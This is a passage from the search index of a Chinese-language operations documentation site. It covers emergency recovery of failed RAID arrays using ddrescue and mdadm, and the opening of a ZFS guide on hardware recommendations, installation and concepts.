JSON\uff0c\u200b\u4ee5\u53ca\u200b\u53c2\u8003\u200b\u6548\u679c\u200b\u3002</p>"},{"location":"ops/storage/raid/#emergency-rescue","title":"\u7d27\u6025\u200b\u6551\u63f4","text":"<p>\u200b\u6570\u636e\u200b\u65e0\u4ef7\u200b\uff0c\u200b\u8c28\u614e\u200b\u64cd\u4f5c\u200b\uff01</p> <p>\u200b\u5982\u679c\u200b\u4e0d\u200b\u6ee1\u8db3\u200b\u4ee5\u4e0b\u200b\u4efb\u4e00\u200b\u6761\u4ef6\u200b\uff0c\u200b\u8bf7\u200b\u54a8\u8be2\u200b\u4e13\u4e1a\u200b\u7684\u200b\u6570\u636e\u6062\u590d\u200b\u516c\u53f8\u200b\uff0c\u200b\u4e0d\u8981\u200b\u8f7b\u6613\u200b\u5c1d\u8bd5\u200b\u81ea\u884c\u200b\u64cd\u4f5c\u200b\uff1a</p> <ul> <li>\u200b\u6570\u636e\u200b\u7684\u200b\u4ef7\u503c\u200b\u4e0d\u9ad8\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u627f\u53d7\u200b\u4e22\u5931\u200b\u7684\u200b\u98ce\u9669\u200b</li> <li>\u200b\u6709\u200b\u8db3\u591f\u200b\u7684\u200b\u65f6\u95f4\u200b\u3001\u200b\u7cbe\u529b\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u8d2d\u7f6e\u200b\u4e34\u65f6\u200b\u5b58\u50a8\u200b\u7684\u200b\u786c\u76d8\u200b\u7684\u200b\u9884\u7b97\u200b</li> <li>\u200b\u6709\u200b\u8db3\u591f\u200b\u7684\u200b\u76d8\u200b\u80fd\u200b\u88ab\u200b\u8bc6\u522b\u200b\uff0c\u200b\u5e76\u200b\u80fd\u591f\u200b\u8bfb\u53d6\u200b\u5927\u90e8\u5206\u200b\u7684\u200b\u5185\u5bb9\u200b</li> </ul> <p>\u200b\u4e5f\u200b\u53ef\u200b\u9605\u8bfb\u200b Hackergame 2021 \u200b\u9898\u76ee\u200b\u300c\u200b\u9635\u5217\u200b\u6062\u590d\u200b\u5927\u5e08\u200b\u300d\u200b\u7684\u200b\u5b98\u65b9\u200b\u9898\u89e3\u200b</p> <p>\u200b\u76f8\u5173\u200b\u5185\u5bb9\u200b\u57fa\u4e8e\u200b\u771f\u5b9e\u200b\u7684\u200b\u4e8b\u4ef6\u200b\u6539\u7f16\u200b\u3002\u200b\u8be5\u200b\u9898\u76ee\u200b\u8981\u6c42\u200b\u9009\u624b\u200b\u4ece\u200b\u5b8c\u6574\u200b\u672a\u635f\u574f\u200b\u4f46\u200b\u914d\u7f6e\u200b\u672a\u77e5\u200b\u7684\u200b RAID \u200b\u76d8\u7ec4\u200b\u4e2d\u200b\u6062\u590d\u200b\u6570\u636e\u200b\u3002 \u200b\u9898\u76ee\u200b\u63cf\u8ff0\u200b\u4e0e\u200b\u9898\u89e3\u200b\u53c2\u89c1\u200b https://github.com/USTC-Hackergame/hackergame2021-writeups/tree/master/official/%E9%98%B5%E5%88%97%E6%81%A2%E5%A4%8D%E5%A4%A7%E5%B8%88\u3002</p> <p>\u200b\u5c3d\u7ba1\u200b\u6ca1\u6709\u200b\u4eba\u4f1a\u200b\u60f3\u200b\u7ecf\u5386\u200b\u8fd9\u6837\u200b\u7684\u200b\u4e8b\u60c5\u200b\uff0c\u200b\u4f46\u662f\u200b\u8fd9\u79cd\u200b\u4e8b\u60c5\u200b\u786e\u5b9e\u200b\u6709\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u53d1\u751f\u200b\uff0c\u200b\u7279\u522b\u200b\u662f\u200b\u5728\u200b\u7f3a\u5c11\u200b\u7ecf\u9a8c\u200b\uff0c\u200b\u6216\u200b\u76d1\u63a7\u200b\u8bbe\u65bd\u200b\u4e0d\u200b\u5b8c\u5584\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u3002 \u200b\u4e0d\u8fc7\u200b\u4e00\u6761\u200b\u53ef\u80fd\u200b\u4e0d\u7b97\u200b\u90a3\u4e48\u200b\u7cdf\u7cd5\u200b\u7684\u200b\u7ecf\u9a8c\u200b\u662f\u200b\uff1a\u200b\u5728\u200b\u9635\u5217\u200b\u56e0\u4e3a\u200b\u786c\u76d8\u200b\u95ee\u9898\u200b\u4e0b\u7ebf\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u6700\u540e\u200b\u4e00\u5757\u200b\u62a5\u544a\u200b\u635f\u574f\u200b\u7684\u200b\u786c\u76d8\u200b\u5f88\u591a\u200b\u65f6\u5019\u200b\u4ecd\u7136\u200b\u53ef\u4ee5\u200b\u8bfb\u53d6\u200b\u5927\u90e8\u5206\u200b\u5185\u5bb9\u200b\uff0c \u200b\u4e0d\u8fc7\u200b\u5728\u6b64\u4e4b\u524d\u200b\u7684\u200b\u574f\u76d8\u200b\u53ef\u80fd\u200b\u5c31\u200b\u6ca1\u200b\u90a3\u4e48\u200b\u597d\u8fd0\u200b\u4e86\u200b\u2014\u2014\u200b\u63d2\u200b\u5728\u200b\u7535\u8111\u200b\u4e0a\u200b\u5982\u679c\u200b\u53d1\u51fa\u200b\u4e86\u200b\u602a\u200b\u58f0\u97f3\u200b\uff0c\u200b\u90a3\u4e48\u200b\u591a\u534a\u200b\u662f\u200b\u771f\u7684\u200b\u574f\u200b\u4e86\u200b\u3002</p> <p>\u200b\u90a3\u4e48\u200b\u9996\u5148\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u83b7\u53d6\u200b\u6240\u6709\u200b\u8fd8\u200b\u80fd\u200b\u8bfb\u53d6\u200b\u7684\u200b\u786c\u76d8\u200b\uff0cdump \u200b\u51fa\u200b\u5bf9\u5e94\u200b\u7684\u200b\u5757\u200b\u8bbe\u5907\u200b\u5168\u90e8\u200b\u7684\u200b\u5185\u5bb9\u200b\u3002\u200b\u8fd9\u4e2a\u200b\u8fc7\u7a0b\u200b\u4f1a\u200b\u5f88\u200b\u6f2b\u957f\u200b\uff0c\u200b\u800c\u4e14\u200b\u9700\u8981\u200b\u5927\u91cf\u200b\u7684\u200b\u5b58\u50a8\u7a7a\u95f4\u200b\u3002 \u200b\u5927\u90e8\u5206\u200b\u4eba\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u9996\u5148\u200b\u8003\u8651\u200b\u4f7f\u7528\u200b <code>dd</code> \u200b\u6765\u200b\u505a\u200b\u8fd9\u4e2a\u200b\u4e8b\u60c5\u200b\uff0c\u200b\u4f46\u662f\u200b\u5728\u200b\u8fd9\u79cd\u200b\u573a\u5408\u200b\u4e0b\u200b\uff0c<code>dd</code> \u200b\u4e0d\u662f\u200b\u975e\u5e38\u200b\u53ef\u9760\u200b\u2014\u2014\u200b\u5982\u679c\u200b\u9047\u5230\u200b\u4e86\u200b I/O \u200b\u9519\u8bef\u200b\uff0c\u200b\u90a3\u4e48\u200b <code>dd</code> \u200b\u9ed8\u8ba4\u200b\u7684\u200b\u884c\u4e3a\u200b\u662f\u200b \u200b\u76f4\u63a5\u200b\u9000\u51fa\u200b\uff0c\u200b\u5373\u4f7f\u200b\u6dfb\u52a0\u200b\u4e86\u200b <code>conv=noerror</code> \u200b\u9009\u9879\u200b\uff0c\u200b\u5176\u200b\u586b\u5145\u200b\u7684\u200b\u884c\u4e3a\u200b\u4e5f\u200b\u662f\u200b\u4e0d\u200b\u53ef\u63a7\u200b\u7684\u200b\u3002\u200b\u56e0\u6b64\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u63a8\u8350\u200b\u4f7f\u7528\u200b ddrescue \u200b\u8fdb\u884c\u200b\u5e94\u6025\u200b\u7684\u200b\u8bfb\u53d6\u200b\u5168\u90e8\u200b\u5757\u200b\u8bbe\u5907\u200b\u5185\u5bb9\u200b\u7684\u200b\u5de5\u4f5c\u200b\uff08\u200b\u53c2\u8003\u200b\u64cd\u4f5c\u200b\uff09\u3002</p> <p>\u200b\u5728\u200b\u64cd\u4f5c\u200b\u5b8c\u6210\u200b\u540e\u200b\uff0c\u200b\u5f97\u5230\u200b\u7684\u200b\u6587\u4ef6\u200b\u5efa\u8bae\u200b\u8bbe\u7f6e\u200b\u53ea\u8bfb\u200b\u6216\u200b\u989d\u5916\u200b\u5907\u4efd\u200b\uff0c\u200b\u907f\u514d\u200b\u540e\u7eed\u200b\u64cd\u4f5c\u200b\u51fa\u73b0\u610f\u5916\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u4f7f\u7528\u200b\u7684\u200b\u662f\u200b\u8f6f\u4ef6\u200b RAID\uff0c\u200b\u90a3\u4e48\u200b\u5143\u200b\u6570\u636e\u200b\u4e00\u822c\u200b\u4f4d\u4e8e\u200b\u786c\u76d8\u200b/\u200b\u5206\u533a\u200b\u7684\u200b\u5f00\u5934\u200b\uff0c\u200b\u5982\u679c\u200b\u5e78\u8fd0\u200b\u7684\u8bdd\u200b\uff0c\u200b\u4f7f\u7528\u200b\u672c\u5730\u200b\u56de\u73af\u200b\u6302\u8f7d\u200b\u4e3a\u5757\u200b\u8bbe\u5907\u200b\u540e\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u4f7f\u7528\u200b\u5bf9\u5e94\u200b\u7684\u200b RAID \u200b\u5de5\u5177\u200b\u6302\u8f7d\u200b\u4e86\u200b\uff1b \u200b\u4f46\u200b\u5982\u679c\u200b\u662f\u200b\u786c\u4ef6\u200b RAID \u200b\u7684\u8bdd\u200b\uff0c\u200b\u5c31\u200b\u6ca1\u6709\u200b\u8fd9\u4e48\u200b\u5e78\u8fd0\u200b\u4e86\u200b\u2014\u2014\u200b\u786c\u4ef6\u200b RAID \u200b\u7684\u200b\u5143\u200b\u6570\u636e\u200b\u4e00\u822c\u200b\u4f4d\u4e8e\u200b\u786c\u76d8\u200b\u672b\u5c3e\u200b\uff0c\u200b\u4f7f\u7528\u200b\u7684\u200b\u683c\u5f0f\u200b\u4e3a\u200b DDF\uff08Disk Data Format\uff09\u3002\u200b\u5e76\u4e14\u200b\uff0c\u200b\u6ca1\u6709\u200b\u901a\u7528\u200b\u7684\u200b\u5de5\u5177\u200b\u53ef\u4ee5\u200b\u89e3\u6790\u200b DDF \u200b\u683c\u5f0f\u200b\u7684\u200b\u5143\u200b\u6570\u636e\u200b<sup>1</sup>\uff0c\u200b\u56e0\u6b64\u200b\u9700\u8981\u200b\u81ea\u884c\u200b\u5224\u65ad\u200b RAID \u200b\u7684\u200b\u914d\u7f6e\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u6bcf\u5757\u200b\u76d8\u200b\u5728\u200b\u5176\u4e2d\u200b\u7684\u200b\u4f4d\u7f6e\u200b\uff0c\u200b\u53ef\u80fd\u200b\u9700\u8981\u200b\u5728\u200b\u4e4b\u540e\u200b\u7684\u200b\u6302\u8f7d\u200b\u4e2d\u200b\u591a\u6b21\u200b\u8bd5\u9519\u200b\u540e\u200b\u624d\u80fd\u200b\u627e\u5230\u200b\u6b63\u786e\u200b\u7684\u200b\u914d\u7f6e\u200b\u3002</p> <p>\u200b\u5bf9\u4e8e\u200b RAID 0 \u200b\u7c7b\u578b\u200b\u7684\u200b\u914d\u7f6e\u200b\uff08\u200b\u5305\u62ec\u200b RAID 10/01\uff09\uff0c<code>mdadm</code> \u200b\u5de5\u5177\u200b\u652f\u6301\u200b\u62fc\u63a5\u200b\u591a\u4e2a\u200b\uff08\u200b\u6ca1\u6709\u200b mdadm superblock \u200b\u7684\u200b\uff09\u200b\u5757\u200b\u8bbe\u5907\u200b\u7684\u200b\u5185\u5bb9\u200b\u7ec4\u6210\u200b RAID\uff0c\u200b\u53c2\u8003\u200b\u547d\u4ee4\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>sudo mdadm --build --assume-clean -c 128 --level=0 --raid-devices=8 --size=195364584 /dev/md0 /dev/mapper/disk1 /dev/mapper/disk2 /dev/mapper/disk3 /dev/mapper/disk4 /dev/mapper/disk5 /dev/mapper/disk6 /dev/mapper/disk7 /dev/mapper/disk8\n</code></pre> <p>\u200b\u5982\u679c\u200b\u662f\u200b RAID 5/6\uff0c<code>mdadm</code> \u200b\u4e0d\u200b\u652f\u6301\u200b\u76f4\u63a5\u200b\u62fc\u63a5\u200b\uff0c\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b assemble \u200b\u64cd\u4f5c\u200b\uff0c\u200b\u4f46\u662f\u200b\u5bf9\u5e94\u200b\u7684\u200b\u64cd\u4f5c\u200b\u4f1a\u200b\u8986\u76d6\u200b\u6389\u200b\u6bcf\u5757\u200b\u76d8\u200b\u5f00\u5934\u200b\u7684\u200b\u4e00\u90e8\u5206\u200b<sup>2</sup>\u3002 \u200b\u53e6\u200b\u4e00\u79cd\u200b\u65b9\u6cd5\u200b\u662f\u200b\u7f16\u5199\u200b\u4f7f\u7528\u200b fuse \u200b\u7684\u200b\u811a\u672c\u200b\u6302\u8f7d\u200b\uff0c\u200b\u66f4\u52a0\u200b\u7075\u6d3b\u200b\u4f46\u662f\u200b\u6027\u80fd\u200b\u8f83\u5dee\u200b\uff0c\u200b\u811a\u672c\u200b\u5185\u5bb9\u200b\u53ef\u200b\u53c2\u7167\u200b\u300c\u200b\u9635\u5217\u200b\u6062\u590d\u200b\u5927\u5e08\u200b\u300d\u200b\u7684\u200b\u5b98\u65b9\u200b\u9898\u89e3\u200b\u7684\u200b\u540e\u200b\u534a\u200b\u90e8\u5206\u200b\u3002</p> <p>\u200b\u5728\u200b\u6b64\u6b21\u200b\u5b9e\u9645\u200b\u7684\u200b\u4e8b\u4ef6\u200b\u4e2d\u200b\uff0c\u200b\u6700\u7ec8\u200b\u6210\u529f\u200b\u6302\u8f7d\u200b\u4e86\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u3002\u200b\u5bf9\u200b\u6587\u4ef6\u200b\u68c0\u67e5\u200b\u540e\u200b\u53d1\u73b0\u200b\u6709\u200b\u90e8\u5206\u200b\u6587\u4ef6\u200b\u635f\u574f\u200b\uff0c\u200b\u4f46\u662f\u200b\u8fd9\u4e9b\u200b\u6587\u4ef6\u200b\u90fd\u200b\u4e0d\u200b\u91cd\u8981\u200b\uff0c\u200b\u6700\u7ec8\u200b\u6210\u529f\u200b\u6062\u590d\u200b\u4e86\u200b\u6240\u6709\u200b\u91cd\u8981\u200b\u6570\u636e\u200b\u3002</p>"},{"location":"ops/storage/raid/#supplement","title":"\u8865\u5145\u200b\u9605\u8bfb","text":"<ul> <li>MegaCli wrapper for LSI MegaRAID for Debian/Ubuntu/RHEL/CentOS\uff1a\u200b\u4e00\u4e2a\u200b\u670d\u52a1\u5668\u200b\u8fd0\u7ef4\u200b\u7684\u200b MegaCLI \u200b\u811a\u672c\u200b\uff0c\u200b\u5176\u4e2d\u200b\u5305\u542b\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u53ef\u4f9b\u53c2\u8003\u200b\u7684\u200b\u64cd\u4f5c\u200b\u4e0e\u200b\u63a8\u8350\u200b\u8bbe\u7f6e\u200b</li> <li>Linux Raid Wiki\uff1aLinux-raid \u200b\u90ae\u4ef6\u200b\u5217\u8868\u200b\u7684\u200b\u793e\u533a\u200b\u6210\u5458\u200b\u7ef4\u62a4\u200b\u7684\u200b wiki\uff0c\u200b\u5305\u542b\u200b\u4e86\u200b\u5927\u91cf\u200b\u6709\u7528\u200b\u7684\u200b\u4fe1\u606f\u200b</li> </ul> <ol> <li> <p>mdadm \u200b\u5de5\u5177\u200b\u53ef\u80fd\u200b\u652f\u6301\u200b DDF\uff0c\u200b\u4f46\u662f\u200b\u5728\u200b\u6211\u4eec\u200b\u81ea\u884c\u200b\u6570\u636e\u6062\u590d\u200b\u7684\u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\u6ca1\u6709\u200b\u6210\u529f\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u53ef\u80fd\u200b\u662f\u200b\u786c\u4ef6\u200b\u5382\u5546\u200b\u7684\u200b DDF \u200b\u683c\u5f0f\u200b\u4e0e\u200b mdadm \u200b\u5b9e\u73b0\u200b\u4e0d\u7b26\u200b\u3002\u00a0\u21a9</p> </li> <li> <p>\u200b\u901a\u8fc7\u200b\u4f7f\u7528\u200b dmsetup \u200b\u53ef\u4ee5\u200b\u5b9e\u73b0\u200b\u7c7b\u4f3c\u200b\u4e8e\u200b CoW \u200b\u7684\u200b\u64cd\u4f5c\u200b\uff1a\u200b\u5728\u200b\u53ea\u8bfb\u200b\u7684\u200b image \u200b\u4e0a\u200b\u6dfb\u52a0\u200b\u4e00\u5c42\u200b CoW \u200b\u7684\u200b overlay\uff0c\u200b\u76f8\u5173\u200b\u811a\u672c\u200b\u53ef\u4ee5\u200b\u53c2\u8003\u200b https://gist.github.com/coderjo/c8de3ecc31f1d6450254b5e97ea2c595\u3002\u00a0\u21a9</p> </li> </ol>"},{"location":"ops/storage/zfs/","title":"ZFS","text":"<p>\u200b\u4e3b\u8981\u200b\u4f5c\u8005\u200b</p> <p>@iBug</p> <p>\u200b\u672c\u6587\u200b\u7f16\u5199\u200b\u4e2d\u200b</p> <p>ZFS\uff08Zettabyte File System\uff09\u200b\u867d\u7136\u200b\u540d\u53eb\u200b\u201cFS\u201d\uff0c\u200b\u4f46\u662f\u200b\u96c6\u6210\u200b\u4e86\u200b\u4e00\u7cfb\u5217\u200b\u5b58\u50a8\u7ba1\u7406\u200b\u529f\u80fd\u200b\uff0c\u200b\u5305\u62ec\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u3001\u200b\u5377\u200b\u7ba1\u7406\u200b\u3001\u200b\u5feb\u7167\u200b\u3001\u200b\u6570\u636e\u5b8c\u6574\u6027\u200b\u68c0\u67e5\u548c\u200b\u4fee\u590d\u200b\u7b49\u200b\uff0c\u200b\u5e38\u200b\u88ab\u79f0\u4f5c\u200b\u201c\u200b\u5355\u673a\u200b\u6700\u5f3a\u200b\u5b58\u50a8\u200b\u65b9\u6848\u200b\u201d\u3002 ZFS \u200b\u5728\u200b\u5185\u90e8\u200b\u91c7\u7528\u200b\u201c\u200b\u65e5\u5fd7\u200b\u5f0f\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u201d<sup>1</sup>\u200b\u8bbe\u8ba1\u200b\uff0c\u200b\u8fd9\u200b\u4f7f\u5f97\u200b ZFS \u200b\u65e0\u9700\u200b\u50cf\u200b ext4\u3001XFS \u200b\u7b49\u200b\u4f20\u7edf\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u90a3\u6837\u200b\u8fdb\u884c\u200b fsck \u200b\u68c0\u67e5\u200b\uff0c\u200b\u4e14\u200b\u5373\u4f7f\u200b\u53d1\u751f\u610f\u5916\u200b\u65ad\u7535\u200b\u7b49\u200b\u60c5\u51b5\u200b\uff0c\u200b\u4e5f\u200b\u80fd\u200b\u4fdd\u8bc1\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u5185\u90e8\u200b\u7684\u200b\u5b8c\u6574\u6027\u200b\u548c\u200b\u4e00\u81f4\u6027\u200b\u3002</p> <p>\u200b\u867d\u7136\u200b ZFS \u200b\u6ca1\u6709\u200b\u7279\u6b8a\u200b\u7684\u200b\u7cfb\u7edf\u200b\u8981\u6c42\u200b\uff0c\u200b\u4f46\u662f\u200b\u6211\u4eec\u200b\u63a8\u8350\u200b\u5728\u200b\u5177\u6709\u200b\u8f83\u200b\u597d\u200b\u914d\u7f6e\u200b\u7684\u200b\u670d\u52a1\u5668\u200b\u4e0a\u200b\u4f7f\u7528\u200b ZFS\uff0c\u200b\u4ee5\u200b\u83b7\u5f97\u200b\u66f4\u597d\u200b\u7684\u200b\u6027\u80fd\u200b\u548c\u200b\u7a33\u5b9a\u6027\u200b\u3002</p> <ul> <li>\u200b\u56fa\u6001\u200b\u786c\u76d8\u200b\uff0c\u200b\u6216\u8005\u200b\u591a\u5757\u200b\u89c4\u683c\u200b\u76f8\u540c\u200b\u7684\u200b\u5927\u5bb9\u91cf\u200b\u673a\u68b0\u200b\u786c\u76d8\u200b\uff08\u200b\u63a8\u8350\u200b 4 \u200b\u5757\u200b\u6216\u200b\u66f4\u200b\u591a\u200b\uff09\u3002\u200b\u5c3d\u91cf\u907f\u514d\u200b\u7528\u200b\u5355\u5757\u200b\u673a\u68b0\u200b\u786c\u76d8\u200b\u8fd0\u884c\u200b ZFS\u3002</li> <li>\u200b\u5982\u679c\u200b\u9884\u671f\u200b\u9700\u8981\u200b\u627f\u8f7d\u200b\u8f83\u91cd\u200b\u7684\u200b\u8bfb\u5199\u200b\u8d1f\u8f7d\u200b\uff0c\u200b\u63a8\u8350\u200b\u4f7f\u7528\u200b\u5927\u5bb9\u91cf\u200b\u5185\u5b58\u200b\u7528\u4e8e\u200b\u7f13\u5b58\u200b\uff08ZFS \u200b\u5b98\u65b9\u200b\u63a8\u8350\u200b\u6bcf\u200b 1 TB \u200b\u5b58\u50a8\u5bb9\u91cf\u200b\u914d\u7f6e\u200b 1 GB \u200b\u5185\u5b58\u200b\uff09\u3002<ul> <li>\u200b\u5982\u679c\u200b\u6253\u7b97\u200b\u542f\u7528\u200b ZFS \u200b\u7684\u200b\u53bb\u200b\u91cd\u200b\uff08deduplication\uff09\u200b\u529f\u80fd\u200b\uff0c\u200b\u63a8\u8350\u200b\u4e3a\u200b\u6bcf\u200b TB \u200b\u5b58\u50a8\u5bb9\u91cf\u200b\u914d\u5907\u200b\u81f3\u5c11\u200b 5 GB \u200b\u5185\u5b58\u200b\uff08\u200b\u4f46\u662f\u200b\u5b98\u65b9\u200b\u63a8\u8350\u200b\u7684\u200b\u6bd4\u4f8b\u200b\u662f\u200b 30 GB\uff09\u3002</li> </ul> </li> <li>\u200b\u4e00\u822c\u6765\u8bf4\u200b\uff0c\u200b\u6211\u4eec\u200b\u4e0d\u200b\u63a8\u8350\u200b\u4f7f\u7528\u200b L2ARC\uff0c\u200b\u5177\u4f53\u200b\u539f\u56e0\u200b\u8f83\u4e3a\u200b\u590d\u6742\u200b\uff0c\u200b\u8bf7\u200b\u9605\u8bfb\u200b\u672c\u6587\u200b\u7684\u200b ARC \u200b\u7ae0\u8282\u200b\u4e0e\u200b L2ARC \u200b\u7ae0\u8282\u200b\u3002</li> <li>\u200b\u73b0\u4ee3\u200b\u7684\u200b\u591a\u200b\u6838\u5fc3\u200b CPU\uff0c\u200b\u4ee5\u4fbf\u200b\u5904\u7406\u200b ZFS \u200b\u7684\u200b\u6570\u636e\u5b8c\u6574\u6027\u200b\u68c0\u67e5\u548c\u200b\u900f\u660e\u200b\u538b\u7f29\u200b\u7b49\u200b\u4efb\u52a1\u200b\u3002</li> </ul> <p>\u200b\u5982\u679c\u200b\u53ea\u662f\u200b\u4e3a\u4e86\u200b\u5c06\u200b ZFS \u200b\u7684\u200b\u9ad8\u7ea7\u200b\u529f\u80fd\u200b\u7528\u4e8e\u200b\u4e2a\u4eba\u200b\u5b58\u50a8\u200b\uff0c\u200b\u5982\u200b NAS \u200b\u7b49\u200b\uff0c\u200b\u90a3\u4e48\u200b\u4f60\u200b\u5927\u200b\u53ef\u200b\u5ffd\u7565\u200b\u4ee5\u4e0a\u200b\u6240\u6709\u200b\u63a8\u8350\u200b\uff0c\u200b\u5728\u200b Intel J3455 \u200b\u548c\u200b 4 GB \u200b\u5185\u5b58\u200b\u7684\u200b\u5c0f\u200b\u4e3b\u673a\u200b\u4e0a\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u8f7b\u677e\u200b\u8fd0\u884c\u200b ZFS\uff0c\u200b\u4f8b\u5982\u200b QNAP \u200b\u7684\u200b\u4e2a\u4eba\u200b NAS \u200b\u8bbe\u5907\u200b\u5c31\u200b\u5df2\u7ecf\u200b\u9ed8\u8ba4\u200b\u91c7\u7528\u200b ZFS \u200b\u4e86\u200b\u3002</p>"},{"location":"ops/storage/zfs/#installation","title":"\u5b89\u88c5","text":"<p>\u200b\u5c3d\u7ba1\u200b OpenZFS \u200b\u4e5f\u200b\u662f\u200b\u4e00\u4e2a\u200b\u5f00\u6e90\u200b\u9879\u76ee\u200b\uff0c\u200b\u4f46\u662f\u200b\u7531\u4e8e\u200b\u5f00\u6e90\u200b\u534f\u8bae\u200b\u4e0d\u200b\u517c\u5bb9\u200b\uff08OpenZFS \u200b\u91c7\u7528\u200b CDDL\uff0cLinux \u200b\u5185\u6838\u200b\u91c7\u7528\u200b GPL\uff09\uff0c\u200b\u56e0\u6b64\u200b OpenZFS \u200b\u65e0\u6cd5\u200b\u76f4\u63a5\u200b\u96c6\u6210\u200b\u5230\u200b Linux \u200b\u5185\u6838\u200b\u4e2d\u200b\u3002</p> <ul> <li> <p>Debian \u200b\u5c06\u200b ZFS \u200b\u7684\u200b\u4ee3\u7801\u200b\u4ee5\u200b DKMS \u200b\u6a21\u5757\u200b\u7684\u200b\u5f62\u5f0f\u200b\u6253\u5305\u200b\uff08\u200b\u5305\u540d\u200b <code>zfs-dkms</code>\uff09\uff0c\u200b\u4ee5\u4fbf\u200b\u5728\u200b\u66f4\u65b0\u200b\u5185\u6838\u200b\u4e4b\u540e\u200b\u81ea\u52a8\u200b\u7f16\u8bd1\u200b\u548c\u200b\u5b89\u88c5\u200b\u3002</p> <p>Debian backports</p> <p>\u200b\u53d7\u9650\u4e8e\u200b Debian \u200b\u7684\u200b\u7a33\u5b9a\u6027\u200b\u653f\u7b56\u200b\uff0cstable \u200b\u7684\u200b\u8f6f\u4ef6\u200b\u6e90\u4e2d\u200b\u7684\u200b ZFS \u200b\u7248\u672c\u200b\u53ef\u80fd\u200b\u8f83\u200b\u8001\u200b\u3002\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b\u8f83\u200b\u65b0\u200b\u7684\u200b ZFS \u200b\u7248\u672c\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8003\u8651\u200b\u4f7f\u7528\u200b Debian \u200b\u7684\u200b backports \u200b\u4ed3\u5e93\u200b\uff08\u200b\u4f8b\u5982\u200b\u5728\u200b Debian Bookworm \u200b\u4e2d\u200b\uff0c\u200b\u5bf9\u5e94\u200b\u4f7f\u7528\u200b backports \u200b\u7684\u200b\u547d\u4ee4\u200b\u662f\u200b <code>apt install -t bookworm-backports zfs-dkms</code>\uff09\u3002</p> </li> <li> <p>Ubuntu \u200b\u81ea\u200b 20.04 LTS \u200b\u8d77\u200b\u63d0\u4f9b\u200b\u9884\u200b\u7f16\u8bd1\u200b\u597d\u200b\u7684\u200b <code>zfs.ko</code>\uff08\u200b\u8f6f\u4ef6\u5305\u200b <code>linux-modules-$(uname -r)</code>\uff09\uff0c\u200b\u56e0\u6b64\u200b\u65e0\u9700\u200b\u518d\u200b\u5b89\u88c5\u200b <code>zfs-dkms</code><sup>8</sup>\u3002</p> </li> </ul> <p>\u200b\u4e0d\u8bba\u662f\u200b Debian \u200b\u8fd8\u662f\u200b Ubuntu\uff0c\u200b\u90fd\u200b\u9700\u8981\u200b\u5b89\u88c5\u200b <code>zfsutils-linux</code> \u200b\u8f6f\u4ef6\u5305\u200b\uff0c\u200b\u4ee5\u4fbf\u200b\u4f7f\u7528\u200b ZFS \u200b\u7684\u200b\u547d\u4ee4\u884c\u200b\u5de5\u5177\u200b\u3002</p> root on ZFS <p>\u200b\u5982\u679c\u200b\u4f60\u200b\u8ba1\u5212\u200b\u5c06\u200b rootfs \u200b\u4e5f\u200b\u5b89\u88c5\u200b\u5728\u200b/\u200b\u8fc1\u79fb\u200b\u81f3\u200b ZFS \u200b\u4e0a\u200b\u7684\u8bdd\u200b\uff0c\u200b\u8fd8\u200b\u9700\u8981\u200b\u5b89\u88c5\u200b <code>zfs-initramfs</code> \u200b\u8f6f\u4ef6\u5305\u200b\uff0c\u200b\u4ee5\u4fbf\u200b\u5728\u200b\u7cfb\u7edf\u542f\u52a8\u200b\u9636\u6bb5\u200b\u52a0\u8f7d\u200b ZFS \u200b\u6a21\u5757\u200b\u3002</p> <p>\u200b\u5728\u200b\u8fd9\u79cd\u200b\u914d\u7f6e\u200b\u4e0b\u200b\uff0c\u200b\u6211\u4eec\u200b\u5f3a\u70c8\u5efa\u8bae\u200b\u4e3a\u200b <code>/boot</code> \u200b\u76ee\u5f55\u200b\u5355\u72ec\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u5206\u533a\u200b\u5e76\u200b\u4f7f\u7528\u200b ext4 \u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff0c\u200b\u4ee5\u200b\u907f\u514d\u200b GRUB \u200b\u5728\u200b\u7279\u5b9a\u6761\u4ef6\u200b\u4e0b\u200b\u65e0\u6cd5\u200b\u8bc6\u522b\u200b ZFS \u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b\u95ee\u9898\u200b\u3002 \u200b\u53e6\u200b\u4e00\u79cd\u200b\u529e\u6cd5\u200b\u662f\u200b\u4f7f\u7528\u200b systemd-boot\uff0c\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u642d\u914d\u200b UKI \u200b\u542f\u52a8\u200b\u3002</p>"},{"location":"ops/storage/zfs/#concepts","title":"\u57fa\u7840\u200b\u6982\u5ff5","text":"<p>\u200b\u4e0e\u200b LVM \u200b\u548c\u200b\u5176\u4ed6\u200b\u5377\u200b\u7ba1\u7406\u5de5\u5177\u200b\u7c7b\u4f3c\u200b\uff0cZFS \u200b\u4e5f\u200b\u5c06\u200b\u5b58\u50a8\u8bbe\u5907\u200b\u7ec4\u7ec7\u200b\u6210\u200b\u591a\u7ea7\u200b\u7ed3\u6784\u200b\uff1a</p> <ul> <li>vdev\uff08Virtual Device\uff09\u200b\u662f\u200b ZFS 